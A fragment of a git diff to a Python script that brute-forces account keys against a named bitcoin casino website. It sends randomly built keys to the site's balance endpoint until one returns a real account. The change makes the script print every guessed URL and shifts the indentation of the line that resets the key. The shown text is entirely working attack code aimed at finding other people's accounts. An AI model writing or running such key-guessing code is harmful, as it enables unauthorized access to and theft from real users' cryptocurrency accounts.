@@ -18,10 +18,10 @@ while accountEmpty:
         word = word + letter
     response = requests.get("https://bitcoinvideocasino.com/account/balance?account_key=" + word)
     data = response.json()
+    print("https://bitcoinvideocasino.com/account/balance?account_key=" + word)
     if "message" not in data:
-     print("https://bitcoinvideocasino.com/account/balance?account_key=" + word)
      accountEmpty = False
     else:
      count += 1
      print(count)
-    word = ''
+ word = ''
